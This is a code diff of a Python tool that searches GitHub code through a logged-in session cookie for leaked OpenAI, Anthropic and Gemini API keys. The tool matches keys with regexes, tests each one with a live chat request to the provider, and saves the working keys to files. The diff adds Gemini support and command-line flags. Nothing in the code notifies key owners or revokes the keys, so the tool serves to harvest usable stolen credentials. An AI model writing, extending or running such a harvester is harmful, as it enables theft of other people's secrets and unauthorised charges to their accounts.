@@ -46,17 +46,17 @@ PATH = os.path.abspath(os.path.dirname(__file__))
 
 
 logging.basicConfig(
-    filename=os.path.join(PATH, "search.log"),
     format="%(asctime)s - %(levelname)s - %(message)s",
     level=logging.INFO,
     datefmt="%Y-%m-%d %H:%M:%S",
+    handlers=[logging.FileHandler(os.path.join(PATH, "search.log")), logging.StreamHandler()],
 )
 
 
-def search_github(query: str, page: int, cookie: str) -> str:
+def search_github(query: str, page: int, session: str) -> str:
     """use github web search instead of rest api due to it not support regex syntax"""
 
-    if page <= 0 or isblank(cookie) or isblank(query):
+    if page <= 0 or isblank(session) or isblank(query):
         return ""
 
     url = f"https://github.com/search?o=desc&p={page}&type=code&q={query}"
@@ -64,7 +64,7 @@ def search_github(query: str, page: int, cookie: str) -> str:
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Referer": "https://github.com",
         "User-Agent": USER_AGENT,
-        "Cookie": f"user_session={cookie}",
+        "Cookie": f"user_session={session}",
     }
 
     content = http_get(url=url, headers=headers)
@@ -75,13 +75,13 @@ def search_github(query: str, page: int, cookie: str) -> str:
     return content
 
 
-def search_github_code(query: str, cookie: str, page: int) -> list[str]:
+def search_github_code(query: str, session: str, page: int) -> list[str]:
     text = trim(query)
     if not text:
         return []
 
     keyword = urllib.parse.quote(text, safe="")
-    content = search_github(query=keyword, page=page, cookie=cookie)
+    content = search_github(query=keyword, page=page, session=session)
     if isblank(content):
         return []
 
@@ -120,16 +120,16 @@ def extract(url: str, regex: str, retries: int = 3) -> list[str]:
 
 def scan(
     regex: str,
-    cookie: str,
+    session: str,
     check: typing.Callable,
     filename: str,
     query: str = "",
     page_num: int = 5,
     num_thread: int = None,
 ) -> None:
-    regex, cookie = trim(regex), trim(cookie)
-    if not regex or not cookie:
-        logging.error(f"[Scan] skip to scan due to regex or cookie is empty")
+    regex, session = trim(regex), trim(session)
+    if not regex or not session:
+        logging.error(f"[Scan] skip to scan due to regex or session is empty")
         return
 
     if not isinstance(check, typing.Callable):
@@ -146,7 +146,7 @@ def scan(
         return
 
     query = trim(query) or f"/{regex}/"
-    queries = [[query, cookie, x] for x in range(1, page_num + 1)]
+    queries = [[query, session, x] for x in range(1, page_num + 1)]
     candidates = multi_thread_run(
         func=search_github_code,
         tasks=queries,
@@ -157,12 +157,41 @@ def scan(
         logging.warning(f"[Scan] cannot found any link with query: {query}")
         return
 
+    logging.info(f"start to extract candidates from {len(links)} links")
+
     tasks = [[x, regex, 3] for x in links if x]
     result = multi_thread_run(func=extract, tasks=tasks, num_threads=num_thread)
-    items = list(itertools.chain.from_iterable(result))
-    if not items:
+
+    records = list()
+    filepath = os.path.join(PATH, filename)
+    if os.path.exists(filepath) and os.path.isfile(filepath):
+        # load exists keys
+        with open(filepath, "r", encoding="utf8") as f:
+            lines = f.readlines()
+            for line in lines:
+                text = trim(line)
+                if not text or text.startswith(";") or text.startswith("#"):
+                    continue
+
+                records.append(text)
+
+        logging.info(f"[Scan] loaded {len(records)} exists keys from file {filepath}")
+
+        # backup up exists file with current time
+        words = filename.rsplit(".", maxsplit=1)
+        filename = f"{words[0]}-{time.strftime('%Y%m%d%H%M%S', time.localtime())}"
+        if len(words) > 1:
+            filename += f".{words[1]}"
+
+        os.rename(filepath, os.path.join(PATH, filename))
+
+    records.extend(list(itertools.chain.from_iterable(result)))
+    if not records:
         logging.warning(f"[Scan] cannot extract any candidate with query: {query}")
         return
+
+    items = list(set(records))
+    logging.info(f"start to verify {len(items)} potential keys")
 
     masks = multi_thread_run(func=check, tasks=items, num_threads=num_thread)
     keys = [items[i] for i in range(len(masks)) if masks[i]]
@@ -170,16 +199,6 @@ def scan(
     if not keys:
         logging.warning(f"[Scan] finished, cannot found any key with query: {query}")
     else:
-        filepath = os.path.join(PATH, filename)
-        if os.path.exists(filepath) and os.path.isfile(filepath):
-            # backup up exists file with current time
-            words = filename.rsplit(".", maxsplit=1)
-            filename = f"{words[0]}-{time.strftime('%Y%m%d%H%M%S', time.localtime())}"
-            if len(words) > 1:
-                filename += f".{words[1]}"
-
-            os.rename(filepath, os.path.join(PATH, filename))
-
         saved = write_file(directory=filepath, lines=keys)
         if not saved:
             logging.error(f"[Scan] failed to save keys to file: {filepath}, keys: {keys}")
@@ -187,24 +206,30 @@ def scan(
         logging.info(f"[Scan] finished, found {len(keys)} valid keys, save them to file: {filepath}")
 
 
-def chat(url: str, headers: dict, model: str, retries: int = 2, timeout: int = 10) -> dict:
+def chat(url: str, headers: dict, model: str = "", params: dict = None, retries: int = 2, timeout: int = 10) -> dict:
     url, model = trim(url), trim(model)
-    if not url or not model:
-        logging.error(f"[Check] url or model cannot be empty")
+    if not url:
+        logging.error(f"[Check] url cannot be empty")
         return None
 
     if not isinstance(headers, dict):
-        logging.error(f"[Check] headers must be a dict and cannot be empty")
+        logging.error(f"[Check] headers must be a dict")
         return None
+    elif len(headers) == 0:
+        headers["content-type"] = "application/json"
 
-    payload = json.dumps(
-        {
+    if not params or not isinstance(params, dict):
+        if not model:
+            logging.error(f"[Check] model cannot be empty")
+            return None
+
+        params = {
             "model": model,
             "stream": False,
             "messages": [{"role": "user", "content": DEFAULT_QUESTION}],
         }
-    ).encode("utf-8")
 
+    payload = json.dumps(params).encode("utf8")
     timeout = max(1, timeout)
     retries = max(1, retries)
     data, attempt = None, 0
@@ -225,7 +250,7 @@ def chat(url: str, headers: dict, model: str, retries: int = 2, timeout: int = 1
     return data
 
 
-def scan_openai_keys(cookie: str) -> None:
+def scan_openai_keys(session: str) -> None:
     def verify(token: str) -> bool:
         token = trim(token)
         if not token:
@@ -239,10 +264,10 @@ def scan_openai_keys(cookie: str) -> None:
     regex = r"sk-[a-zA-Z0-9]{48}"
     filename = "openai-keys.txt"
 
-    scan(regex=regex, cookie=cookie, check=verify, filename=filename)
+    scan(regex=regex, session=session, check=verify, filename=filename)
 
 
-def scan_anthropic_keys(cookie: str) -> None:
+def scan_anthropic_keys(session: str) -> None:
     def verify(token: str) -> bool:
         token = trim(token)
         if not token:
@@ -260,7 +285,28 @@ def scan_anthropic_keys(cookie: str) -> None:
     regex = r"sk-ant-api03-[a-zA-Z0-9_\-]{86}-[a-zA-Z0-9_]{8}"
     filename = "anthropic-keys.txt"
 
-    scan(regex=regex, cookie=cookie, check=verify, filename=filename)
+    scan(regex=regex, session=session, check=verify, filename=filename)
+
+
+def scan_gemini_keys(session: str) -> None:
+    def verify(token: str) -> bool:
+        token = trim(token)
+        if not token:
+            return False
+
+        model = "gemini-exp-1206"
+        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={token}"
+        headers = {"content-type": "application/json"}
+        params = {"contents": [{"role": "user", "parts": [{"text": DEFAULT_QUESTION}]}]}
+
+        data = chat(url=url, headers=headers, params=params)
+        return data is not None
+
+    query = "/GEMINI_API_KEY=[a-zA-Z0-9_]{39}/"
+    regex = r"GEMINI_API_KEY=([a-zA-Z0-9_]{39})"
+    filename = "gemini-keys.txt"
+
+    scan(regex=regex, session=session, check=verify, filename=filename, query=query)
 
 
 def trim(text: str) -> str:
@@ -390,7 +436,7 @@ def encoding_url(url: str) -> str:
 
 
 def write_file(directory: str, lines: str | list) -> bool:
-    if not directory or not lines or isinstance(lines, (str, list)):
+    if not directory or not lines or not isinstance(lines, (str, list)):
         logging.error(f"filename or lines is invalid, filename: {directory}")
         return False
 
@@ -418,9 +464,46 @@ def write_file(directory: str, lines: str | list) -> bool:
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
+
+    parser.add_argument(
+        "-a",
+        "--all",
+        dest="all",
+        action="store_true",
+        default=False,
+        help="execute all supported scan tasks",
+    )
+
     parser.add_argument(
         "-c",
-        "--cookie",
+        "--claude",
+        dest="claude",
+        action="store_true",
+        default=False,
+        help="scan claude api keys",
+    )
+
+    parser.add_argument(
+        "-g",
+        "--gemini",
+        dest="gemini",
+        action="store_true",
+        default=False,
+        help="scan gemini api keys",
+    )
+
+    parser.add_argument(
+        "-o",
+        "--openai",
+        dest="openai",
+        action="store_true",
+        default=False,
+        help="scan openai api keys",
+    )
+
+    parser.add_argument(
+        "-s",
+        "--session",
         type=str,
         required=True,
         default="",
@@ -428,10 +511,19 @@ if __name__ == "__main__":
     )
 
     args = parser.parse_args()
-    cookie = trim(args.cookie)
-    if not cookie:
-        logging.error(f"cookie cannot be empty")
+    session = trim(args.session)
+    if not session:
+        logging.error(f"session cannot be empty")
         exit(1)
 
-    scan_openai_keys(cookie=cookie)
-    scan_anthropic_keys(cookie=cookie)
+    if args.all or args.claude:
+        logging.info(f"start to scan claude api keys")
+        scan_anthropic_keys(session=session)
+
+    if args.all or args.gemini:
+        logging.info(f"start to scan gemini api keys")
+        scan_gemini_keys(session=session)
+
+    if args.all or args.openai:
+        logging.info(f"start to scan openai api keys")
+        scan_openai_keys(session=session)
